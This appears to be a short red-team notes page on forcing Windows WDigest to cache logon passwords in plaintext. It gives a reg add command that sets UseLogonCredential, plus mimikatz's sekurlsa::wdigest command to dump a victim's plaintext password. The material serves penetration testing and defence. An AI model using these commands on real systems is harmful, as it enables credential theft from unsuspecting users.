# Forcing WDigest to Store Credentials in Plaintext

As part of WDigest authentication provider, Windows versions up to 8 and 2012 used to store logon credentials in memory in plaintext by default, which is no longer the case with newer  Windows versions.&#x20;

It is still possible, however, to force WDigest to store secrets in plaintext.

## Execution

Let's first make sure that wdigest is not storing credentials in plaintext on our target machine running Windows 10:

```csharp
// attacker@victim
sekurlsa::wdigest
```

Note the password field is null:

![[mimikatz 2.2.0 x64 (oe.eo]] 5\_13\_2019 10\_42\_39 PM.png>)

Now as an attacker, we can modify the following registry key to force the WDigest to store credentials in plaintext next time someone logs on to the target system:

```csharp
// attacker@victim
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

![[mimikatz 2.2.0 x64 (oe.eo]] 5\_13\_2019 10\_44\_54 PM.png>)

Say, now the victim on the target system spawned another shell:

```csharp
// victim@local
runas /user:mantvydas powershell
```

Running mimikatz for wdigest credentials now reveals the plaintext password of the victim user `mantvydas`:

![[wdigestdemo.gif]]

## References

[p16.praetorian.com/blog/mitigating-mimikatz-wdigest-cleartext-credential-theft](https://p16.praetorian.com/blog/mitigating-mimikatz-wdigest-cleartext-credential-theft)

